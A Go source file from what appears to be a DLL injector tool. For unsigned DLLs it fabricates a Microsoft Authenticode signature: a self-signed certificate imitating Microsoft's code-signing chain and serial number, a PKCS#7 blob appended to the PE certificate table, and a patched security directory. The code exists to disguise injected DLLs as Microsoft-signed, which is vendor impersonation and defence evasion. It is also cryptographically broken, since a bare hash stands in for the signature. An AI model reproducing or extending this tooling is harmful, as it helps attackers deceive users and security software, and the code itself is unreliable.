package injector

import (
	"crypto/rand"
	"crypto/rsa"
	"crypto/sha256"
	"crypto/x509"
	"crypto/x509/pkix"
	"encoding/asn1"
	"encoding/binary"
	"fmt"
	"math/big"
	"os"
	"path/filepath"
	"time"
	"unsafe"
)

const (
	IMAGE_DIRECTORY_ENTRY_SECURITY = 4
	WIN_CERT_TYPE_PKCS_SIGNED_DATA = 0x0002
	WIN_CERT_REVISION_2_0          = 0x0200
)

type WinCertificate struct {
	Length      uint32
	Revision    uint16
	CertType    uint16
	Certificate []byte
}

var microsoftCertInfo = struct {
	Subject   string
	Issuer    string
	SerialNum string
	NotBefore time.Time
	NotAfter  time.Time
}{
	Subject:   "CN=Microsoft Corporation, O=Microsoft Corporation, L=Redmond, S=Washington, C=US",
	Issuer:    "CN=Microsoft Code Signing PCA 2011, O=Microsoft Corporation, L=Redmond, S=Washington, C=US",
	SerialNum: "61077656000000000033",
	NotBefore: time.Date(2021, 1, 1, 0, 0, 0, 0, time.UTC),
	NotAfter:  time.Date(2025, 12, 31, 23, 59, 59, 0, time.UTC),
}

func (i *Injector) handleDLLSignature(dllBytes []byte) ([]byte, error) {
	i.logger.Info("检查DLL签名状态")

	isSigned, err := i.isDLLSigned(dllBytes)
	if err != nil {
		return nil, fmt.Errorf("failed to check DLL signature: %v", err)
	}

	if isSigned {
		i.logger.Info("DLL已有签名，跳过签名伪造")
		return dllBytes, nil
	}

	i.logger.Info("DLL未签名，正在创建Microsoft签名")

	signedBytes, err := i.addMicrosoftSignature(dllBytes)
	if err != nil {
		return nil, fmt.Errorf("failed to add Microsoft signature: %v", err)
	}

	i.logger.Info("成功为DLL添加Microsoft签名")
	return signedBytes, nil
}

func (i *Injector) isDLLSigned(dllBytes []byte) (bool, error) {

	peHeader, err := ParsePEHeader(dllBytes)
	if err != nil {
		return false, fmt.Errorf("failed to parse PE header: %v", err)
	}

	if len(peHeader.DataDirectories) > IMAGE_DIRECTORY_ENTRY_SECURITY {
		certDir := peHeader.DataDirectories[IMAGE_DIRECTORY_ENTRY_SECURITY]
		return certDir.VirtualAddress != 0 && certDir.Size != 0, nil
	}

	return false, nil
}

func (i *Injector) addMicrosoftSignature(dllBytes []byte) ([]byte, error) {

	cert, err := i.createFakeMicrosoftCertificate()
	if err != nil {
		return nil, fmt.Errorf("failed to create fake certificate: %v", err)
	}

	signedData, err := i.createPKCS7SignedData(cert, dllBytes)
	if err != nil {
		return nil, fmt.Errorf("failed to create PKCS#7 signed data: %v", err)
	}

	winCert := WinCertificate{
		Length:      uint32(8 + len(signedData)),
		Revision:    WIN_CERT_REVISION_2_0,
		CertType:    WIN_CERT_TYPE_PKCS_SIGNED_DATA,
		Certificate: signedData,
	}

	certSize := (winCert.Length + 7) &^ 7
	if certSize > winCert.Length {
		padding := make([]byte, certSize-winCert.Length)
		winCert.Certificate = append(winCert.Certificate, padding...)
		winCert.Length = certSize
	}

	newDllBytes := make([]byte, len(dllBytes)+int(certSize))
	copy(newDllBytes, dllBytes)

	certOffset := len(dllBytes)
	binary.LittleEndian.PutUint32(newDllBytes[certOffset:], winCert.Length)
	binary.LittleEndian.PutUint16(newDllBytes[certOffset+4:], winCert.Revision)
	binary.LittleEndian.PutUint16(newDllBytes[certOffset+6:], winCert.CertType)
	copy(newDllBytes[certOffset+8:], winCert.Certificate)

	err = i.updateCertificateDirectory(newDllBytes, uint32(certOffset), certSize)
	if err != nil {
		return nil, fmt.Errorf("failed to update certificate directory: %v", err)
	}

	return newDllBytes, nil
}

func (i *Injector) createFakeMicrosoftCertificate() (*x509.Certificate, error) {

	privateKey, err := rsa.GenerateKey(rand.Reader, 2048)
	if err != nil {
		return nil, fmt.Errorf("failed to generate private key: %v", err)
	}

	template := x509.Certificate{
		SerialNumber: big.NewInt(0),
		Subject: pkix.Name{
			CommonName:   "Microsoft Corporation",
			Organization: []string{"Microsoft Corporation"},
			Locality:     []string{"Redmond"},
			Province:     []string{"Washington"},
			Country:      []string{"US"},
		},
		Issuer: pkix.Name{
			CommonName:   "Microsoft Code Signing PCA 2011",
			Organization: []string{"Microsoft Corporation"},
			Locality:     []string{"Redmond"},
			Province:     []string{"Washington"},
			Country:      []string{"US"},
		},
		NotBefore:             microsoftCertInfo.NotBefore,
		NotAfter:              microsoftCertInfo.NotAfter,
		KeyUsage:              x509.KeyUsageDigitalSignature,
		ExtKeyUsage:           []x509.ExtKeyUsage{x509.ExtKeyUsageCodeSigning},
		BasicConstraintsValid: true,
	}

	if serialNum, ok := new(big.Int).SetString(microsoftCertInfo.SerialNum, 10); ok {
		template.SerialNumber = serialNum
	}

	certDER, err := x509.CreateCertificate(rand.Reader, &template, &template, &privateKey.PublicKey, privateKey)
	if err != nil {
		return nil, fmt.Errorf("failed to create certificate: %v", err)
	}

	cert, err := x509.ParseCertificate(certDER)
	if err != nil {
		return nil, fmt.Errorf("failed to parse certificate: %v", err)
	}

	return cert, nil
}

func (i *Injector) createPKCS7SignedData(cert *x509.Certificate, data []byte) ([]byte, error) {

	hash := sha256.Sum256(data)




	contentInfo := struct {
		ContentType asn1.ObjectIdentifier
		Content     asn1.RawValue `asn1:"explicit,tag:0"`
	}{
		ContentType: asn1.ObjectIdentifier{1, 2, 840, 113549, 1, 7, 2},
	}

	signedDataContent := struct {
		Version          int
		DigestAlgorithms []asn1.ObjectIdentifier
		ContentInfo      struct {
			ContentType asn1.ObjectIdentifier
		}
		Certificates []asn1.RawValue `asn1:"implicit,tag:0,optional"`
		SignerInfos  []struct {
			Version         int
			IssuerAndSerial struct {
				Issuer       asn1.RawValue
				SerialNumber *big.Int
			}
			DigestAlgorithm    asn1.ObjectIdentifier
			SignatureAlgorithm asn1.ObjectIdentifier
			Signature          []byte
		}
	}{
		Version:          1,
		DigestAlgorithms: []asn1.ObjectIdentifier{{2, 16, 840, 1, 101, 3, 4, 2, 1}},
		ContentInfo: struct {
			ContentType asn1.ObjectIdentifier
		}{
			ContentType: asn1.ObjectIdentifier{1, 2, 840, 113549, 1, 7, 1},
		},
		Certificates: []asn1.RawValue{{FullBytes: cert.Raw}},
		SignerInfos: []struct {
			Version         int
			IssuerAndSerial struct {
				Issuer       asn1.RawValue
				SerialNumber *big.Int
			}
			DigestAlgorithm    asn1.ObjectIdentifier
			SignatureAlgorithm asn1.ObjectIdentifier
			Signature          []byte
		}{{
			Version: 1,
			IssuerAndSerial: struct {
				Issuer       asn1.RawValue
				SerialNumber *big.Int
			}{
				Issuer:       asn1.RawValue{FullBytes: cert.RawIssuer},
				SerialNumber: cert.SerialNumber,
			},
			DigestAlgorithm:    asn1.ObjectIdentifier{2, 16, 840, 1, 101, 3, 4, 2, 1},
			SignatureAlgorithm: asn1.ObjectIdentifier{1, 2, 840, 113549, 1, 1, 11},
			Signature:          hash[:],
		}},
	}

	signedDataBytes, err := asn1.Marshal(signedDataContent)
	if err != nil {
		return nil, fmt.Errorf("failed to marshal signed data: %v", err)
	}

	contentInfo.Content = asn1.RawValue{
		Class:      0,
		Tag:        0,
		IsCompound: true,
		Bytes:      signedDataBytes,
	}

	pkcs7Bytes, err := asn1.Marshal(contentInfo)
	if err != nil {
		return nil, fmt.Errorf("failed to marshal PKCS#7: %v", err)
	}

	return pkcs7Bytes, nil
}

func (i *Injector) updateCertificateDirectory(dllBytes []byte, certOffset, certSize uint32) error {

	if len(dllBytes) < 64 {
		return fmt.Errorf("file too small")
	}

	peOffset := *(*uint32)(unsafe.Pointer(&dllBytes[60]))
	if peOffset >= uint32(len(dllBytes)) {
		return fmt.Errorf("invalid PE offset")
	}

	magic := *(*uint16)(unsafe.Pointer(&dllBytes[peOffset+24]))

	var certDirOffset uint32
	if magic == 0x10b {
		certDirOffset = peOffset + 24 + 96 + IMAGE_DIRECTORY_ENTRY_SECURITY*8
	} else if magic == 0x20b {
		certDirOffset = peOffset + 24 + 112 + IMAGE_DIRECTORY_ENTRY_SECURITY*8
	} else {
		return fmt.Errorf("unsupported PE format")
	}

	if certDirOffset+8 > uint32(len(dllBytes)) {
		return fmt.Errorf("certificate directory offset out of bounds")
	}

	binary.LittleEndian.PutUint32(dllBytes[certDirOffset:], certOffset)
	binary.LittleEndian.PutUint32(dllBytes[certDirOffset+4:], certSize)

	return nil
}

func (i *Injector) saveTempSignedDLL(signedBytes []byte) (string, error) {

	tempDir := filepath.Join(os.TempDir(), "dll_injector_signed")
	if err := os.MkdirAll(tempDir, 0755); err != nil {
		return "", fmt.Errorf("failed to create temp directory: %v", err)
	}

	originalName := filepath.Base(i.dllPath)
	tempPath := filepath.Join(tempDir, "signed_"+originalName)

	if err := os.WriteFile(tempPath, signedBytes, 0644); err != nil {
		return "", fmt.Errorf("failed to write signed DLL: %v", err)
	}

	i.logger.Info("已保存签名DLL到临时文件", "path", tempPath)
	return tempPath, nil
}


func (i *Injector) TestIsDLLSigned(dllBytes []byte) (bool, error) {
	return i.isDLLSigned(dllBytes)
}

func (i *Injector) TestHandleDLLSignature(dllBytes []byte) ([]byte, error) {
	return i.handleDLLSignature(dllBytes)
}
